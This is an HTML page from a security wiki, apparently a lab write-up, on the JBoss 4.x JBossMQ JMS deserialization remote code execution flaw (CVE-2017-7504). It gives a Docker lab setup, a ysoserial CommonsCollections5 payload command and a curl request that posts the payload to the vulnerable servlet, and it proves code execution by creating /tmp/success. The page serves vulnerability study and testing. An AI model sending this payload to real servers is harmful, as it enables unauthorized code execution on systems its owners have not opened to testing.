<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jboss/CVE-2017-7504/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduce", url: "#vulnerability-reproduce" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2017-12149/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2017-12149/README.zh-cn/" class="btn btn-xs btn-link">
        JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）
      </a>
    </div>
    
  </div>

    

    <h1 id="jboss-4x-jbossmq-jms-deserialization-remote-code-execution-cve-2017-7504">JBoss 4.x JBossMQ JMS Deserialization Remote Code Execution (CVE-2017-7504)<a class="headerlink" href="#jboss-4x-jbossmq-jms-deserialization-remote-code-execution-cve-2017-7504" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Red Hat JBoss Application Server is a JavaEE-based open source application server. In JBoss AS 4.x and earlier versions, there is a deserialization vulnerability in the HTTPServerILServlet.java file of the JMS over HTTP Invocation Layer in JBossMQ implementation. Remote attackers can exploit this vulnerability to execute arbitrary code by using specially crafted serialized data.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
<li><a href="https://www.youtube.com/watch?v=jVMr4eeJ2Po">https://www.youtube.com/watch?v=jVMr4eeJ2Po</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to start JBoss AS 4.0.5:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the environment is started, the target will be available at <code>http://your-ip:8080</code>.</p>
<h2 id="vulnerability-reproduce">Vulnerability Reproduce<a class="headerlink" href="#vulnerability-reproduce" title="Permanent link">&para;</a></h2>
<p>This vulnerability exists in the <code>/jbossmq-httpil/HTTPServerILServlet</code> request. We can use the CommonsCollections5 exploitation chain from ysoserial to reproduce it. Generate the payload:</p>
<div class="highlight"><pre><span></span><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 &quot;touch /tmp/success&quot; &gt; 1.ser
</code></pre></div>
<p>Send the content of 1.ser file as POST Body:</p>
<div class="highlight"><pre><span></span><code>curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>Execute <code>docker compose exec jboss bash</code> to enter the container, and you can see that <code>/tmp/success</code> has been successfully created.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2017-12149/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2017-12149/README.zh-cn/" class="btn btn-xs btn-link">
        JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>